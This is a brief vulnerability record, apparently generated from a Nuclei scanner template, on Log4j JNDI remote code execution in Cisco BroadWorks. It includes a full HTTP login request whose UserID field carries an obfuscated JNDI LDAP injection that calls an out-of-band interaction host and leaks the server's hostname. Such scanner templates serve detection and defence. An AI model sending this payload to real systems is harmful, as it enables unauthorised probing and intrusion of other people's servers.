# Vulnerability: Cisco BroadWorks - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`cisco-broadworks-log4j-rce.yaml`)

## Description
Cisco BroadWorks is susceptible to Log4j JNDI remote code execution. Cisco BroadWorks is an enterprise-grade calling and collaboration platform delivering unmatched performance, security and scale.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /commpilot/servlet/Login HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}
Content-Type: application/x-www-form-urlencoded

domain={{str}}.com&UserID=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&EnteredUserID=a&Password=a
```

